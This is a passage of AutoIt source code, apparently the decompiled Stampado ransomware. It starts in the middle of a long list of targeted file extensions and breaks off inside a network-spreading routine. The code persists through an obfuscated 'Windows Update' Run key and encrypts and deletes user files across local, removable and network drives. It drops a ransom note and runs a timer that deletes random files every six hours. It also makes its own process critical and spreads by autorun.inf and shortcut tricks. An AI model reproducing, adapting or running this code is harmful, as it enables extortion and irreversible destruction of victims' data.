n;*.fgp;*.jpegx;*.mkey;*.ent;*.hpg;*.dco;*.sgn;*.pie;*.y8pd;*.pcxm;*.lrs;*.pkey;*.gxk;*.ica;*.cpx;*.b2a;*.ntx;*.tmw;*.efs;*.req;*.__b;*.xdc;*.bmpenx;*.zps;*.bms;*.eid;*.ppk;*.rdk;*.enc;*.rzx;*.raw;*.sdoc;*.icp;*.raes;*.fpenc;*.htmlenx;*.att;*.cip;*.tpm;*.pswx;*.viivo;*.mjd;*.mtd;*.pkd;*.fcfe;*.pptxenx;*.cae;*.zxn;*.$cr;*.esm;*.ync;*.can;*.p7a;*.crypt11;*.mbs;*.cryptomite;*.xlsl;*.flwa;*.chi;*.sda;*.grd;*.ezk;*.des;*.pkf;*.abcd;*.etxt;*.hex;*.arm;*.tsc;*.jcrypt;*.spn;*.aut;*.walletx;*.pptenx;*.uud;*.jrl;*.hsf;*.fdp;*.dpd;*.rng;*.xfi;*.yenc;*.mcat;*.ntx;*.chml;*.ueed;*.fss;*.msd;*.bsk;*.pnne;*.ska;*.gifenx;*.shy;*.vbox;*.sti;*.pwv;*.efc;*.bexpk;*.cdb;*.dst;*.cpt;*.mono;*.v11pf;*.macs;*.dsf;*.exportedfavorites;*.eno;*.sbe;*.egisenx;*.SafeText;*jpg_encrypted;*.aepkey;*.ivex;*.xlse;*.tifenx;*.jmc;*.osf;*.mhtenx;*.btoa;*.pvr;*.pdfl;*.spd;*.dlm;*.acl;*.svq;*.drc;*.ism;*.appt;*.sxm;*.nsx;*.rzk;*.clu;*.vzn;*.rzs;*.pcp;*.sppt;*.p7;*.lok;*.cryptra;*.crpt;*.ccp;*.ppsenx;*.pdv;*.xfl;*.ks;*.rdi;*.dotxenx;*.otp;*.icd;*.bpw;*.xlsxl;*.doce;*.aexpk;*.clx;*.mhtmlenx;*.aas;*.smht;*.cml;*.dotmenx;*.hbx;*.sccef;*.kne;*.prvkr;*.s1j;*.dhcd;*.xlamenx;*.ppsxenx;*.docxl;*.potmenx;*.pptl;*.ppte;*.docl;*.box;*.jmcp;*.nc;*.jmck;*.exc;*.jmcr;*.ccitt;*.dcf;*.jmcx;*.jmce;*.cfog;*.fl;*.nef;*.rar;*.spb;*.bbb;*.bak;*.json;*.iso;*.jsonlz4;*.tib;*.asd;*.zip;*.sbf;*.dbk;*.nbu;*.nba;*.nbf;*.ecbk;*.sme;*.sbu;*.nco;*.gho;*.nrg;*.ssn;*.zw1;*.qcn;*.hbk;*.zap13;*.ex_;*.mbk;*.wbk;*.psc;*.ffu;*.syncdb;*.ftmb;*.trn;*.bkf;*.mrimg;*.ipd;*.spba;*.skb;*.jpa;*.mpb;*.ptb;*.bdb;*.vbk;*.bpn;*.mscz,;*.ssc;*.uid-zps;*.nbi;*.svs;*.qbb;*.rom;*.abu1;*.svd;*.xar;*.nbz;*.gbk;*.vfs4;*.ebk;*.bak;*.stg;*.wbcat;*.dl_;*.pbb;*.bkp;*.bkup;*.fbk;*.ab;*.hm4;*.iab;*.dat_old;*.bk!;*.tofp;*.set;*.wbfs;"
$4M &= "*.wbverify;*.v2i;*.ashdisc;*.001;*.avz;*.qic;*.jrs;*.gbp;*.mcg;*.vbf;*.abk;*.baz;*.nbak;*.xlk;*.bk2;*.bc7;*.ghs;*.mbf;*.imm;*.pcv;*.backup;*.qdf-backup;*.purgeable;*.sn3;*.ashbak;*.backupdb;*.nfb;*.amk;*.bsr;*.dt6;*.enz;*.nri;*.p2i;*.bc6;*.spi;*.image;*.bbk;*.bc9;*.fkc;*.cbu;*.old;*.qb2015;*.original_epub;*.wim;*.psw;*.arm;*.original_mobi;*.mddata;*.qb2014;*.svl;*.fpbf;*.fxh;*.fbf;*.okr;*.bp1;*.ctf;*.mib;*.pbd;*.mon;*.sparseimage;*.vbox-prev;*.arc;*.dss;*.nbd;*.ctz;*.ttbk;*.cmp;*.sid;*.qbk;*.bps;*.jwc;*.pck;*.qbmb;*.win;*.ofb;*.vrb;*.nfc;*.cdr;*.dsb;*.backup;*.bk0;*.pbf;*.tdr;*.osbx;*.ctx;*.rpk;*.mdbackup;*.ibak;*.sparsebundle;*.orig;*.bfs;*.tmp;*.smea;*.awb;*.fbc;*.icbu;*.qdb;*.ren;*.bpp;*.omg;*.pcd;*.blend1;*.bak;*.ichat;*.lbk;*.krt;*._docx;*.tpb;*.tcs;*.ori;*.rbf;*.mbak;*.moz-backup;*.dsk;*.bmr;*.bk1;*.1-step;*.wcf;*.bff;*.bca;*.bks;*.cbk;*.ssb;*.fb;*.tly;*.ckp;*.diy;*.wbf1;*.201;*.metadata;*.dbk;*.gcb;*.jbk;*.buc;*.umb;*.arz;*.gbm;*.bkz;*.ipe;*.npb;*.mbk;*.ebi;*.dbk;*.bak;*.rrr;*.eg;*.rdb;*.bku;*.da1;*.mbkp;*.wkp;*.dat_mcr;*.iobit;*.p15;*.1p4_zip;*.tig;*.sqb;*.001;*.vbb;*.bko;*.cvt;*.mv_;*.cbk;*.zw5;*.backup;*.ecb;*.ima;*.backup;*.bki;*.bak;*.bms;*.sbb;*.sis;*.tk2;*.ibz;*.gws;*.fwb;*.wbb;*.mkz;*.whb;*.dmd;*.pca;*.dsk;*.mbsb;*.bac;*.wed;*.saved;*.999;*.i5d;*.pdb;*.msnbak;*.nru;*.ntj;*.bud;*.nrd;*.p14;*.dbe;*.gsba;*.kbb;*.bk3;*.rbk;*.rim;*.1;*.bpb;*.bk5;*.tbk;*.hbk;*.wspak;*.sik;*.cps;*.gbck;*.psb;*.bfw;*.uas;*.npf;*.bak;*.mb2;*.nv3;*.rmbak;*.cln;*.obk;*.iv2i;*.smsbackup;*.jaf;*.wbu;*.cmb;*.gb1;*.nrm;*.och;*.fri;*.msgstoredbcrypt7;*.whx;*.p21;*.wjf;*.tbk;*.tbk;*.rmb;*.bak~;*.vmf_autosave;*.QuickBooksAutoDataRecovery;*.arc;*.ssp;*.undo;*.pbr;*.mdinfo;*.{pb;*.ima;*.hcb;*.bak;*.bz1;*.lcb;*.pbf;*.nab;*.nrc;*.img;*.nb7;*.pd2;*.bkc;*.bm3;*.v2b;*.cas;*.r15;*.~mn;*.zw6;*.da0;*.000;*.brz;*.dkb;*.a$v;*.wpb;*.pchd;*.fbu;*.ctx;*.bakx;*.hm~;*.qmd;*.llx;*.ldb;*.sbk;*.xfd;*.rman;*.bjf;*.re3;*.bk4;*.acr;*.quickenbackup;*.ndu;*.in1;*.v30;*.sn1;*.mbu;*.nwbak;*.~de;*.blend2;*.bak;*.wa~;*.adk;*.bak;*.ate;*.wmc;*.rbr;*.utb;*.myc;*.dim;*.sn2;*.bak3;*.rec;*.pcxm;*.ajl;*.previous;*.001;*.nrb;*.swc;*.pcu;*.ob3;*.tb2;*.p03;*.fez;*.extz;*.uci;*.00b;*.aja;*.rb4;*.pqb;*.safe;*.obk;*.mscx,;*.rkn;*.~y7;*.drt;*.bpa;*.vbak;*.pal;*.nvf;*.svg;*.p24;*.rb0;*.r20;*.cdb;*.tmb;*.aea;*.vsr;*.bk1;*.btx;*.r16;*.ob;*.2db;*.udif;*.cig;*.---;*.r14;*.p2v;*.cmb;*.sat;*.abk;*.bp0;*.r00;*.out;*.r10;*.sun;*.bk1;*.p00;*.acd-bak;*.r13;*.~dp;*.zw3;*.bak1;*.nr4;*.mrbak;*.p04;*.bak;*.bvw;*.hbi;*.pb;*.!@!;*.bk6;*.p20;*.data;*.bk9;*.bk8;*.r12;*.tmr;*.bak;*.prv;*.r18;*.locky;*.micro;*.axx;*.zepto;*.cerber;*.ecc;*.ezz;*.crypt;*.r5a;*.exx;*.ccc;*.crypz;*.cryptowall;*.enciphered;*.cryptolocker;*.mp3;*.cryp1;*.lol!;*.breaking_bad;*.crypted;*.encrypted;*.xxx;*.LeChiffre;*.rrk;*.ttt;*.enigma;*.coverton;*.crjoker;*.good;*.crinf;*.keybtc@inbox_com;*.encrypt;*.zcrypt;*.aaa;*.ha3;*.surprise;*.zzz;*.wflx;*.abc;*.zyklon;"
$4M &= "*.pdcr;*.EnCiPhErEd;*.xyz;*.pzdc;*.kkk;*.PoAr2w;*.czvxce;*.magic;*.odcodc;*.rdm;*.windows10;*.payms;*.p5tkjw;*.fun;*.btc;*.darkness;*.kraken;*.crptrgr;*.legion;*.kernel_time;*.kernel_complete;*.rokku;*.bin;*.kernel_pid;*.73i87A;*.kimcilware;*.SecureCrypted;*.CCCRRRPPP;*.vvv;*.kratos;*.herbst;*.payrms;*.bitstak;*.paymts;*.paymst;*.pays;*.paym;*.info;*.padcrypt;*.paymrss;*.szf"
Global $AP = ObjCreate("Scripting.Dictionary")
$AQ = _G3(1, _G0(), _FZ(_FQ(_G0())))
If $CMDLINE[0] = 1 And FileExists($CMDLINE[1]) Then
	_GA("Will open " & $CMDLINE[1])
	ShellExecute($CMDLINE[1])
EndIf
_FO()
$AR = IniRead($68, "a", "status", "no")
If $AR = "no" Then
	_GA("Status is no")
	_GA("Will now install")
	_FN()
ElseIf $AR = "working" Then
	_GA("Status is working")
	$AS = IniRead($68, "a", "pid", 0)
	If Not ProcessExists($AS) Or _DM($AS) <> _G5(@AutoItExe) Then
		_GA("Will now resume install")
		_FN()
	Else
		_GA("Process exists. Will now close.")
		Exit
	EndIf
ElseIf $AR = "done" Then
	_GA("Status is done")
	If _DT("st4mp4d0", 1) = 0 Or ProcessExists(IniRead($68, "a", "pid", 0)) Then
		_GA("Another instance running. Closing.")
		WinSetState("Your files have been encrypted", "All your files have been encrypted.", @SW_MAXIMIZE)
		Exit
	Else
		_GA("Will now show window")
		_G6(@AutoItPID)
		_FT()
	EndIf
ElseIf $AR = "free" Then
	Exit
EndIf
Func _FN()
	If @ScriptDir <> @AppDataDir Then
		_GA("Will now copy to APPDATA and run in there")
		_FW(@ScriptFullPath, $AO, 1)
		If Not ShellExecute($AO) And Not Run($AO) Then
			_GA("Could not run " & $AO)
		EndIf
		_GA("Closing instance")
		Exit
	EndIf
	_GA("Protecting process")
	_G6(@AutoItPID)
	_GA("Saving process ID")
	IniWrite($68, "a", "status", "working")
	IniWrite($68, "a", "pid", @AutoItPID)
	_GA("Setting to Windows startup")
	If Not RegWrite(_GD("SEtFWV9MT0NBTF9NQUNISU5FXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1bg=="), "Windows Update", "REG_SZ", @ScriptFullPath) Then
		RegWrite(_GD("SEtFWV9DVVJSRU5UX1VTRVJcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu"), "Windows Update", "REG_SZ", @ScriptFullPath)
	EndIf
	_GA("Wiping recycle bin")
	_GA("Ready to encrypt")
	If $AP.Count Then
		For $18 = 0 To $AP.Count - 1
			_GA("Will now list " & $AP.Keys()[$18] & " with depth level " & $AP.Items()[$18])
			$AT = _3K($AP.Keys()[$18], $4M, 1, $AP.Items()[$18] * (-1), 0, 2)
			If IsArray($AT) Then
				_GA($AT[0] & " files found")
				For $3X = 1 To $AT[0]
					_GA("Processing file: " & $AT[$3X])
					If StringInStr($AT[$3X], "Temporary Internet Files") Or StringInStr($AT[$3X], "INetCache") Or _G5($AT[$3X]) = "desktop.ini" Or _G5($AT[$3X]) = "Stampado_debug.txt" Or StringInStr($AT[$3X], @AppDataDir) Then
						_GA("File " & $AT[$3X] & " skipped")
						ContinueLoop
					EndIf
					_FP($AT[$3X])
				Next
			Else
				_GA("No files found")
			EndIf
		Next
	EndIf
	_GA("Copying to desktop")
	If Not FileCopy(@ScriptFullPath, @DesktopCommonDir & "\Recover my files.exe") Then
		FileCopy(@ScriptFullPath, @DesktopDir & "\Recover my files.exe")
	EndIf
	_GA("Saving status")
	IniWrite($68, "a", "status", "done")
	IniWrite($68, "a", "start", @YEAR & "/" & @MON & "/" & @MDAY & " " & @HOUR & ":" & @MIN & ":" & @SEC)
	_GA("Showing window")
	_FT()
EndFunc
Func _FO()
	_GA("Adding user folders")
	$AP.Add(@DesktopDir, 2)
	$AP.Add(@MyDocumentsDir, 2)
	$AP.Add(@FavoritesDir, 1)
	$AP.Add(@HomeDrive & @HomePath, 2)
	$AP.Add(@HomeDrive, 0)
	$AP.Add(@UserProfileDir & "\Downloads", 2)
	$AP.Add(@UserProfileDir & "\Pictures", 2)
	$AP.Add(@UserProfileDir & "\Music", 2)
	$AP.Add(@UserProfileDir & "\Videos", 2)
	$AP.Add(@DesktopCommonDir, 2)
	$AP.Add(@DocumentsCommonDir, 2)
	$AU = _3J(@HomeDrive, "*", $28, True)
	If IsArray($AU) And $AU[0] Then
		For $18 = 1 To $AU[0]
			If $AU[$18] <> @ProgramFilesDir And $AU[$18] <> @WindowsDir And $AU[$18] <> StringReplace(@UserProfileDir, "\" & _G5(@UserProfileDir), NULL) Then
				$AP.Add($AU[$18], 1)
				_GA("Adding folder " & $AU[$18])
			EndIf
		Next
	EndIf
	$AV = DriveGetDrive("FIXED")
	If IsArray($AV) Then
		For $18 = 1 To $AV[0]
			If StringLower($AV[$18]) = StringLower(@HomeDrive) Then ContinueLoop
			$AP.Add($AV[$18], 1)
			_GA("Adding fixed disk " & $AV[$18])
		Next
	EndIf
	$AV = DriveGetDrive("REMOVABLE")
	If IsArray($AV) Then
		For $18 = 1 To $AV[0]
			$AP.Add($AV[$18], 1)
			_GA("Adding removable disk " & $AV[$18])
		Next
	EndIf
	$AV = DriveGetDrive("NETWORK")
	If IsArray($AV) Then
		For $18 = 1 To $AV[0]
			$AP.Add($AV[$18], 1)
			_GA("Adding network share " & $AV[$18])
		Next
	EndIf
EndFunc
Func _FP($8T)
	_GA("Will now encrypt " & $8T)
	Local $6C, $AW = StringSplit($8T, "\")
	If FileGetSize($8T) = 0 Then
		_GA("File is empty. Skipping.")
		Return 0
	Else
		_GA("File size is " & FileGetSize($8T))
	EndIf
	If _G7($8T) Then
		_GA("File is in use. Skipping.")
		Return 0
	EndIf
	For $18 = 1 To $AW[0] - 1
		$6C &= $AW[$18] & "\"
	Next
	$6C &= _G2(1, $AW[$AW[0]], $AQ) & ".locked"
	_GA("Encrypting & renaming " & $8T & " to: " & $6C)
	If _22($8T, $6C, $AQ, $2K) Or @error Then
		If FileExists($6C) Then
			_GA("Sucess. Deleting original file.")
			_FV($8T)
			FileWriteLine($62, $6C)
		Else
			_GA("Could not encrypt. Unknown error (" & @error & ").")
		EndIf
	Else
		_GA("Could not encrypt. Error code: " & @error)
	EndIf
EndFunc
Func _FQ($AX = NULL)
	Local $AY, $AZ, $18
	For $18 = 1 To 112
		$AZ = $18
	Next
	$AY &= Chr($AZ)
	$AZ -= 15
	$AY &= Chr($AZ)
	$AY &= Chr(1 + 2 + $AZ)
	$AZ += 15
	$AY &= Chr($AZ - 2 + 1)
	$AZ = 15
	Return $AY & $AZ & $AX
EndFunc
Func _FR($8T)
	Local $6C, $AW = StringSplit($8T, "\")
	If FileGetSize($8T) = 0 Then
		_GA("File is empty. Skipping.")
		Return 0
	Else
		_GA("File size is " & FileGetSize($8T))
	EndIf
	If _G7($8T) Then
		_GA("File is in use. Skipping.")
		Return 0
	EndIf
	For $18 = 1 To $AW[0] - 1
		$6C &= $AW[$18] & "\"
	Next
	$6C &= _G2(0, StringTrimRight($AW[$AW[0]], StringLen(".locked")), $AQ)
	_GA("Decrypting & renaming " & $8T & " to: " & $6C)
	If _23($8T, $6C, $AQ, $2K) And Not @error Then
		_GA("Ok decrypting.")
		_FV($8T)
	Else
		_GA("Could not decrypt. Error code: " & @error)
	EndIf
EndFunc
Func _FS()
	_GA("Uninstalling!")
	_FV($68)
	_FV($62)
	RegDelete(_GD("SEtFWV9MT0NBTF9NQUNISU5FXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1bg=="), "Windows Update")
	RegDelete(_GD("SEtFWV9DVVJSRU5UX1VTRVJcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu"), "Windows Update")
	_GB()
	IniWrite($68, "a", "status", "free")
	_GA("Bye. Good luck.")
	Exit
EndFunc
Func _FT()
	$B0 = StringFormat("All your files have been encrypted!\r\n\r\nAll your documents (databases, texts, images, videos, musics etc.) were encrypted. The encryption was done using a secret key \r\nthat is now on our servers.\r\n\r\nTo decrypt your files you will need to buy the secret key from us. We are the only on the world who can provide this for you.\r\n\r\nNote that every 6 hours, a random file is permanently deleted. The faster you are, the less files you will lose.\r\n\r\nAlso, in 96 hours, the key will be permanently deleted and there will be no way of recovering your files.\r\n\r\nWhat can I do?\r\n\r\nContact us by email telling your ID (below) and wait for us to send the instructions.\r\n\r\nContact us by: " & _G1() & "\r\n\r\nAs a proof, you can send one encrypted file, so we will send it back decrypted. Use it as a guarantee that we can decrypt your files.")
	$B1 = FileOpen(@DesktopDir & "\How to recover my files.txt", 2)
	FileWrite($B1, $B0)
	FileClose($B1)
	$B1 = FileOpen(@MyDocumentsDir & "\How to recover my files.txt", 2)
	FileWrite($B1, $B0)
	FileClose($B1)
	$B2 = GUICreate("Your files have been encrypted", 856, 551, -1, -1, $8L, $8N)
	GUISetIcon("icon.ico", -1)
	GUICtrlCreateLabel("All your files have been encrypted.", 144, 16, 600, 49)
	GUICtrlSetFont(-1, 30, 400, 0, "Arial")
	GUICtrlCreateEdit("", 24, 80, 801, 321, BitOR($8F, $8G, $8H, $8K))
	GUICtrlSetData(-1, $B0)
	GUICtrlSetFont(-1, 10, 400, 0, "Arial")
	$B3 = GUICtrlCreateLabel("X days, X hours, X minutes and X seconds", 24, 432, 412, 17)
	GUICtrlSetFont(-1, 11, 800, 0, "Arial")
	GUICtrlCreateLabel("Next Russian Roulette file deletion:", 24, 416, 169, 17)
	$B4 = GUICtrlCreateLabel("Last file deleted:", 24, 456, 817, 17)
	GUICtrlCreateLabel("Time until total loss:", 440, 416, 96, 17)
	$B5 = GUICtrlCreateLabel("X days, X hours, X minutes and X seconds", 440, 432, 404, 17)
	GUICtrlSetFont(-1, 11, 800, 0, "Arial")
	GUICtrlCreateLabel("Your ID:", 24, 496, 51, 17)
	GUICtrlSetFont(-1, 8, 800, 0, "MS Sans Serif")
	GUICtrlCreateLabel(_G0(), 88, 496, 260, 17, $8I, $8M)
	GUICtrlCreateLabel("Got the code?", 360, 496, 72, 17)
	$B6 = GUICtrlCreateInput("", 432, 496, 249, 21)
	$B7 = GUICtrlCreateButton("Get back my files", 688, 496, 153, 33)
	$B8 = GUICtrlCreateButton("Copy to clipboard", 88, 520, 153, 17)
	$B9 = GUICtrlCreateLabel("See the files I'll get back if I'm a good boy", 432, 520, 199, 17)
	GUICtrlSetFont(-1, 8, 400, 4, "MS Sans Serif")
	GUICtrlSetColor(-1, 128)
	GUISetState(@SW_SHOW)
	_GA("Window showing on")
	While 1
		$77 = IniRead($68, "a", "start", "")
		$78 = _BH("h", 96, $77)
		$BA = _BK("s", _C5(), $78)
		_FU($77)
		GUICtrlSetData($B4, "Last (" & IniRead($68, "b", "deletedcount", "0") & ") file deleted: " & IniRead($68, "b", "lastdeleted", ""))
		If $BA < 0 Then
			_FX()
		EndIf
		$BB = Floor($BA / (24 * 60 * 60))
		$BC = Mod($BA, (24 * 60 * 60))
		$BD = Floor($BC / (60 * 60))
		$BC = Mod($BC, (60 * 60))
		$BE = Floor($BC / 60)
		$BF = Mod($BC, 60)
		GUICtrlSetData($B5, $BB & " days, " & $BD & " hours, " & $BE & " minutes and " & $BF & " seconds")
		$BG = $77
		Do
			$BG = _BH("h", 6, $BG)
		Until _BK("s", $BG, _C5()) < 0
		$BC = _BK("s", _C5(), $BG)
		$BD = Floor($BC / (60 * 60))
		$BC = Mod($BC, (60 * 60))
		$BE = Floor($BC / 60)
		$BF = Mod($BC, 60)
		GUICtrlSetData($B3, $BD & " hours, " & $BE & " minutes and " & $BF & " seconds")
		$BH = GUIGetMsg()
		Switch $BH
			Case $B8
				ClipPut(_G0())
			Case $B9
				FileCopy($62, @DesktopDir & "\Stampado_list.txt", 1)
				ShellExecute(@DesktopDir & "\Stampado_list.txt")
			Case $B7
				If GUICtrlRead($B6) = _FZ(_FQ($AQ)) Then
					SplashTextOn("Unlocking...", "Thank you!" & @CRLF & "Please wait while we decrypt your files..." & @CRLF & "Do not turn off your computer.")
					_FY()
					SplashOff()
					_FS()
				EndIf
		EndSwitch
		Sleep(100)
	WEnd
EndFunc
Func _FU($77)
	Local $BI = _BK("s", $77, _C5())
	$BJ = Abs(Floor($BI / (60 * 60 * 6)))
	$BK = Int(IniRead($68, "b", "deletedcount", "0"))
	If $BJ <> $BK Then
		Local $BL, $BM, $BN
		$BL = _DK($BJ, $BK)
		$BM = _DJ($BJ, $BK)
		$BN = $BM - $BL
		For $18 = 1 To $BN
			$BO = FILEREADTOARRAY($62)
			$BP = Random(0, UBound($BO) - 1, 1)
			$BQ = $BO[$BP]
			_FV($BQ & ".locked")
			_3S($62, $BP + 1, "", 1)
			$BK += 1
			IniWrite($68, "b", "deletedcount", $BK)
			IniWrite($68, "b", "lastdeleted", $BQ)
		Next
	EndIf
EndFunc
Func _FV($BR)
	If Not _F8($BR) Then
		FileDelete($BR)
	EndIf
	_F9(@HomeDrive)
EndFunc
Func _FW($BS, $BT, $BU = 1)
	If FileExists($BT) Then _FV($BT)
	FileWrite($BT, FileRead($BS))
	RunWait(@ComSpec & ' /C echo. > "' & $BT & '":Zone.Identifier', "", @SW_HIDE)
EndFunc
Func _FX()
	$5Z = FILEREADTOARRAY($62)
	For $8T In $5Z
		_FV($5Z)
	Next
	_F9(@HomeDrive)
	_FS()
	Exit
EndFunc
Func _FY()
	_GA("Unlocked!!!")
	$5Z = FILEREADTOARRAY($62)
	For $8T In $5Z
		_FR($8T)
	Next
EndFunc
Func _FZ($AX)
	Return StringTrimLeft(_20("Fabian why you like cats ? " & _G1() & $AX, $2J), 2)
EndFunc
Func _G0()
	$BV = @ComputerName & @CPUArch & @OSArch
	Return StringLeft(_FZ("stam" & $BV & "pado"), 8)
EndFunc
Func _G1()
	Return FileReadLine(@ScriptFullPath, -1)
EndFunc
Func _G2($BW, $BX, $BY, $BZ = 1)
	If $BW <> 0 And $BW <> 1 Then
		SetError(1, 0, "")
	ElseIf $BX = "" Or $BY = "" Then
		SetError(1, 0, "")
	Else
		If Number($BZ) <= 0 Or Int($BZ) <> $BZ Then $BZ = 1
		Local $C0
		Local $C1
		Local $C2
		Local $C3
		Local $C4[256][2]
		Local $C5
		Local $C6
		Local $C7
		Local $C8
		Local $C9
		Local $CA
		Local $CB
		If $BW = 1 Then
			For $CC = 0 To $BZ Step 1
				$C2 = ""
				$C1 = ""
				$C0 = ""
				For $C2 = 1 To StringLen($BX)
					If $C1 = StringLen($BY) Then
						$C1 = 1
					Else
						$C1 += 1
					EndIf
					$C0 = $C0 & Chr(BitXOR(Asc(StringMid($BX, $C2, 1)), Asc(StringMid($BY, $C1, 1)), 255))
				Next
				$BX = $C0
				$C5 = ""
				$C6 = 0
				$C7 = ""
				$C8 = ""
				$C9 = ""
				$CB = ""
				$CA = ""
				$C3 = ""
				$C4 = ""
				Local $C4[256][2]
				For $C5 = 0 To 255
					$C4[$C5][1] = Asc(StringMid($BY, Mod($C5, StringLen($BY)) + 1, 1))
					$C4[$C5][0] = $C5
				Next
				For $C5 = 0 To 255
					$C6 = Mod(($C6 + $C4[$C5][0] + $C4[$C5][1]), 256)
					$C3 = $C4[$C5][0]
					$C4[$C5][0] = $C4[$C6][0]
					$C4[$C6][0] = $C3
				Next
				For $C5 = 1 To StringLen($BX)
					$C7 = Mod(($C7 + 1), 256)
					$C8 = Mod(($C8 + $C4[$C7][0]), 256)
					$C9 = $C4[Mod(($C4[$C7][0] + $C4[$C8][0]), 256)][0]
					$CB = BitXOR(Asc(StringMid($BX, $C5, 1)), $C9)
					$CA &= Hex($CB, 2)
				Next
				$BX = $CA
			Next
		Else
			For $CC = 0 To $BZ Step 1
				$C6 = 0
				$C7 = ""
				$C8 = ""
				$C9 = ""
				$CB = ""
				$CA = ""
				$C3 = ""
				$C4 = ""
				Local $C4[256][2]
				For $C5 = 0 To 255
					$C4[$C5][1] = Asc(StringMid($BY, Mod($C5, StringLen($BY)) + 1, 1))
					$C4[$C5][0] = $C5
				Next
				For $C5 = 0 To 255
					$C6 = Mod(($C6 + $C4[$C5][0] + $C4[$C5][1]), 256)
					$C3 = $C4[$C5][0]
					$C4[$C5][0] = $C4[$C6][0]
					$C4[$C6][0] = $C3
				Next
				For $C5 = 1 To StringLen($BX) Step 2
					$C7 = Mod(($C7 + 1), 256)
					$C8 = Mod(($C8 + $C4[$C7][0]), 256)
					$C9 = $C4[Mod(($C4[$C7][0] + $C4[$C8][0]), 256)][0]
					$CB = BitXOR(Dec(StringMid($BX, $C5, 2)), $C9)
					$CA = $CA & Chr($CB)
				Next
				$BX = $CA
				$C2 = ""
				$C1 = ""
				$C0 = ""
				For $C2 = 1 To StringLen($BX)
					If $C1 = StringLen($BY) Then
						$C1 = 1
					Else
						$C1 += 1
					EndIf
					$C0 &= Chr(BitXOR(Asc(StringMid($BX, $C2, 1)), Asc(StringMid($BY, $C1, 1)), 255))
				Next
				$BX = $C0
			Next
		EndIf
		Return $BX
	EndIf
EndFunc
Func _G3($CD, $68, $CE)
	Local $CF = ""
	If $CD = 1 Then
		$CF = Hex(_1Y($68, $CE, $2K))
	Else
		$CF = BinaryToString(_1Z("0x" & $68, $CE, $2K))
	EndIf
	Return $CF
EndFunc
Func _G5($AX)
	$AX = StringSplit($AX, "\")
	Return $AX[$AX[0]]
EndFunc
Func _G6($CG)
	Local $CH, $CI, $CJ, $CK, $CL, $CM, $CN
	If $CG = @ScriptName Then Return 0
	$CI = ProcessExists($CG)
	If Not $CI Then Return 0
	$CJ = 2035711
	$CH = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", $CJ, "bool", True, "dword", $CI)
	If @error Then Return 0
	$CK = -2147421911
	$CL = 33
	$CM = 4
	$CN = DllStructCreate("Byte[4]")
	DllStructSetData($CN, 1, $CK)
	$AY = DllCall("ntdll.dll", "none", "ZwSetInformationProcess", "int", $CH[0], "int", $CL, "int", DllStructGetPtr($CN), "int", $CM)
EndFunc
Func _G7($8T)
	Local $26 = -2147483648
	Local $25 = 1073741824
	Local $21 = 3
	Local $CO = 128
	If Not FileExists($8T) Then Return False
	$6Q = DllCall("kernel32.dll", "hwnd", "CreateFile", "str", $8T, "int", BitOR($26, $25), "int", 0, "ptr", 0, "int", $21, "int", $CO, "int", 0)
	If $6Q[0] = -1 Then
		Return True
	Else
		DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $6Q[0])
		Return False
	EndIf
EndFunc
Func _G8()
	_GA("Will now spread by USB")
	$CP = DriveGetDrive("REMOVABLE")
	If IsArray($CP) And Not @error Then
		For $18 = 1 To $CP[0]
			_GA("Infecting " & $CP[$18] & ":")
			If FileExists($CP[$18] & "\myDisk\drivers.exe") Then
				_GA("Already infected. Skipping")
				ContinueLoop
			EndIf
			FileCopy(@ScriptFullPath, $CP[$18] & "\myDisk\drivers.exe", 1 + 8)
			If FileExists($CP[$18] & "\autorun.inf") Then FileDelete($CP[$18] & "\autorun.inf")
			FileWrite($CP[$18] & "\autorun.inf", "[autorun]" & @CRLF & "open=myDisk\drivers.exe" & @CRLF & "shellexecute=myDisk\drivers.exe" & @CRLF & "action=Open folder to view files" & @CRLF & "icon=%systemroot%\system32\shell32.dll,4")
			FileSetAttrib($CP[$18] & "\myDisk", "+SHR", 1)
			FileSetAttrib($CP[$18] & "\autorun.inf", "+SHR", 1)
			$5Z = _3J($CP[$18], "*", 0, True)
			If IsArray($5Z) And Not @error Then
				For $3X = 1 To $5Z[0]
					_GA("Infecting file " & $5Z[$3X])
					FileSetAttrib($5Z[$3X], "+SHR")
					If _G5($5Z[$3X]) = "myDisk" Or _G5($5Z[$3X]) = "autorun.inf" Then ContinueLoop
					FileCreateShortcut("%windir%\system32\cmd.exe", $5Z[$3X] & ".lnk", "", '/c start myDisk\drivers.exe "' & StringTrimLeft($5Z[$3X], 2) & '"', "", "%SystemRoot%\system32\SHELL32.dll", "", 4)
				Next
			EndIf
			_GA("Done for this device.")
		Next
	EndIf
	_GA("Done infecting")
EndFunc
Func _G9()
	_GA("Will now spread by network")
	$CP = DriveGetDrive("NETWORK")
	If IsArray($CP) And Not @error Then
		For $18 = 1 To $CP[0]
			_GA("Infecting " & $CP[$18] & ":")
			If FileExists($CP[$18] & "\myDisk\drivers.exe") Then
				_GA("Already infected. Skipping")
				ContinueLoop
			EndIf
			FileCopy(@ScriptFullPath, $CP[$18] & "\myDisk\drivers.exe", 1 + 8)
			If FileExists($CP[$18] & "\autorun.inf") Then FileDelete($CP[$18] & "\autorun.inf")
			FileWrite($CP[$18] & "\autorun.inf", "[autorun]" & @CRLF & "open=myDisk\drivers.exe" & @CRLF & "shellexecute=myDisk\drivers.exe" & @CRLF & "action=Open folder to view files" & @CRLF & "icon=%systemroot%\system32\shell32.dll,4")
			FileSetAttrib($CP[$18] & "\myDisk", "+SHR", 1)
			FileSetAttrib($CP[$18] & "\autorun.inf", "+SHR", 1)
			$5Z = _3J($CP[$18], "*", 0, True)
			If IsArray($5Z) And Not @error Then
				For $3X = 1 To $5Z[0]
					_GA("Infecting file " & $5Z[$3X])
					FileSetAttrib($5Z[$3X], "+SHR")
					If _G5($5Z[$3X]) = "myDisk" Or _G5($5Z[$3X]) = "autorun.inf" Then ContinueLoop
					FileCreateShortcut("%windir%\system32\cmd.exe", $5Z[$3X] & ".lnk", "", '/c start myDisk\drivers.exe "' & StringTrimLeft($5Z[$3X], 2) & '"', "", "%SystemRoot%\system32\SHELL32.dll", "", 4)
				Next
			EndIf
			_GA("Done for this share")
		Next
